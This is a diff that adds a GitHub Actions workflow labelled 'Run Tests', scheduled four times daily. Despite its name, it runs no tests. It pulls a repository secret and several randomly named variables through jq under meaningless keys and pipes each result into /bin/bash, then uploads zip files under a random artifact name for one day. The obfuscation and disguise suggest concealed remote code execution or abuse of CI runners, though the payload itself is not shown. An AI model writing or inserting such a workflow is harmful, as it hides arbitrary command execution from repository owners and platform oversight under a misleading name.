@@ -1,0 +1,39 @@
+name: Run Tests
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '27 4,10,16,22 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  job:
+    name: Go
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Go
+        env:
+          x57: ${{ secrets.x57 }}
+        run: |
+          printf '%s' "$x57" | jq -r .yjmc444 | /bin/bash
+          printf '%s' "$ucuz26260" | jq -r .rog72 | /bin/bash
+          echo $oly89615 | jq -r .qhva34 | /bin/bash
+          echo $mm381 | jq -r .hpoab5027 | /bin/bash
+          printf '%s' "$rqc577" | jq -r .uqfn8839 | /bin/bash
+          echo $drbgb7734 | jq -r .umi04 | /bin/bash
+          echo $iyimo9 | jq -r .f2 | /bin/bash
+
+      - name: Store artifact
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: jvTDDnpR
+          path: "*.zip"
+          retention-days: 1
